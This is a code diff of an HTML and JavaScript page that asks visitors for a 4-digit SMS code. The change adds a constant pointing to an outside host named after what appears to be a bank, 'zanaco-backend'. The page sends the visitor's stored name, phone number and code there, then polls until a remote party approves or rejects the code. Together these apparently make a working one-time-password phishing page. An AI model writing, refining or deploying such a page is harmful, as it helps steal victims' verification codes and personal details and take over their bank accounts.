@@ -5,116 +5,28 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enter Code</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background: #f6f7fb;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-    }
-
-    .code-container {
-        background: #fff;
-        padding: 30px;
-        border-radius: 12px;
-        width: 100%;
-        max-width: 350px;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        text-align: center;
-    }
-
+    body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .code-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
     h2 { margin-bottom: 8px; }
     p { color: #666; font-size: 14px; }
-
-    .code-boxes {
-        display: flex;
-        justify-content: space-between;
-        margin: 25px 0;
-        transition: all 0.3s ease;
-    }
-
-    .code-boxes input {
-        width: 55px;
-        height: 60px;
-        text-align: center;
-        font-size: 24px;
-        border: 2px solid red;
-        border-radius: 8px;
-        outline: none;
-        transition: border-color 0.2s, box-shadow 0.2s;
-    }
-
-    .code-boxes input:focus {
-        border-color: darkred;
-        box-shadow: 0 0 5px rgba(255,0,0,0.5);
-    }
-
-    .shake {
-        animation: shake 0.4s;
-    }
-
-    @keyframes shake {
-        0% { transform: translateX(0); }
-        25% { transform: translateX(-5px); }
-        50% { transform: translateX(5px); }
-        75% { transform: translateX(-5px); }
-        100% { transform: translateX(0); }
-    }
-
-    button {
-        width: 100%;
-        padding: 12px;
-        background: red;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        cursor: pointer;
-        position: relative;
-    }
-
-    button:disabled {
-        background: #ccc;
-        cursor: not-allowed;
-    }
-
-    .spinner {
-        display: none;
-        width: 20px;
-        height: 20px;
-        border: 3px solid #fff;
-        border-top: 3px solid rgba(255,255,255,0.3);
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-        position: absolute;
-        right: 15px;
-        top: 50%;
-        transform: translateY(-50%);
-    }
-
-    @keyframes spin {
-        0% { transform: translateY(-50%) rotate(0deg); }
-        100% { transform: translateY(-50%) rotate(360deg); }
-    }
-
-    .status {
-        margin-top: 15px;
-        font-size: 14px;
-        color: #555;
-    }
-
-    .error {
-        color: red;
-    }
+    .code-boxes { display: flex; justify-content: space-between; margin: 25px 0; transition: all 0.3s ease; }
+    .code-boxes input { width: 55px; height: 60px; text-align: center; font-size: 24px; border: 2px solid red; border-radius: 8px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .code-boxes input:focus { border-color: darkred; box-shadow: 0 0 5px rgba(255,0,0,0.5); }
+    .shake { animation: shake 0.4s; }
+    @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
+    button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; position: relative; display: flex; justify-content: center; align-items: center; }
+    button:disabled { background: #ccc; cursor: not-allowed; }
+    .spinner { display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid rgba(255,255,255,0.3); border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .status { margin-top: 15px; font-size: 14px; color: #555; }
+    .error { color: red; }
 </style>
 </head>
 
 <body>
 <div class="code-container">
     <h2>Enter Your 4-Digit Code</h2>
-    <p>Please enter the code sent to your sms</p>
+    <p>Please enter the code sent to your SMS</p>
 
     <form id="codeForm">
         <div class="code-boxes" id="codeBoxes">
@@ -125,7 +37,7 @@
         </div>
 
         <button id="submitBtn" disabled>
-            Submit Code
+            <span id="btnText">Submit Code</span>
             <div class="spinner" id="spinner"></div>
         </button>
     </form>
@@ -134,8 +46,11 @@
 </div>
 
 <script>
+const BACKEND_URL = "https://zanaco-backend.onrender.com";
+
 const inputs = document.querySelectorAll('.code-boxes input');
 const button = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
 const statusText = document.getElementById('status');
 const spinner = document.getElementById('spinner');
 const form = document.getElementById('codeForm');
@@ -143,78 +58,85 @@ const codeBoxes = document.getElementById('codeBoxes');
 
 let attempts = 0;
 const maxAttempts = 3;
+let requestId = null;
 
 inputs[0].focus();
 
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/[^0-9]/g, '');
-        if (input.value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-        }
-        checkFilled();
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        button.disabled = ![...inputs].every(i => i.value);
     });
     input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-            inputs[index - 1].focus();
-        }
+        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
     });
 });
-
-function checkFilled() {
-    button.disabled = ![...inputs].every(i => i.value);
-}
 
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
+
     const code = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name');
-    const phone = localStorage.getItem('phone');
+    const name = localStorage.getItem('name') || '';
+    const phone = localStorage.getItem('phone') || '';
 
     button.disabled = true;
-    button.innerText = 'Verifying...';
+    btnText.textContent = 'Verifying...';
     spinner.style.display = 'inline-block';
-    statusText.innerText = 'Please wait while we verify your code...';
+    statusText.textContent = 'Please wait while we verify your code...';
 
-    await fetch('/submit-code', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ name, phone, code })
-    });
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-code`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name, phone, code })
+        });
 
-    pollCodeApproval(code);
+        const data = await res.json();
+        requestId = data.requestId;
+
+        pollCodeApproval();
+    } catch (err) {
+        console.error(err);
+        statusText.textContent = 'Failed to submit code. Try again.';
+        spinner.style.display = 'none';
+        btnText.textContent = 'Submit Code';
+        button.disabled = false;
+    }
 });
 
-async function pollCodeApproval(code) {
+function pollCodeApproval() {
     const interval = setInterval(async () => {
-        const res = await fetch(`/check-code/${code}`);
-        const data = await res.json();
+        try {
+            const res = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
+            const data = await res.json();
 
-        if (data.approved === true) {
-            clearInterval(interval);
-            window.location.href = 'success.html';
-        }
-
-        if (data.approved === false) {
-            clearInterval(interval);
-            attempts++;
-            codeBoxes.classList.add('shake');
-            setTimeout(() => codeBoxes.classList.remove('shake'), 400);
-
-            if (attempts >= maxAttempts) {
-                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
-                button.disabled = true;
-                spinner.style.display = 'none';
-                inputs.forEach(i => i.value = '');
-                return;
+            if (data.approved === true) {
+                clearInterval(interval);
+                window.location.href = 'success.html';
             }
 
-            statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
-            button.innerText = 'Submit Code';
-            spinner.style.display = 'none';
-            inputs.forEach(i => i.value = '');
-            inputs[0].focus();
-            button.disabled = true;
+            if (data.approved === false) {
+                clearInterval(interval);
+                attempts++;
+                codeBoxes.classList.add('shake');
+                setTimeout(() => codeBoxes.classList.remove('shake'), 400);
+
+                if (attempts >= maxAttempts) {
+                    statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
+                    spinner.style.display = 'none';
+                    return;
+                }
+
+                statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
+                spinner.style.display = 'none';
+                inputs.forEach(i => i.value = '');
+                inputs[0].focus();
+                button.disabled = true;
+                btnText.textContent = 'Submit Code';
+            }
+        } catch (err) {
+            console.error(err);
         }
     }, 2000);
 }
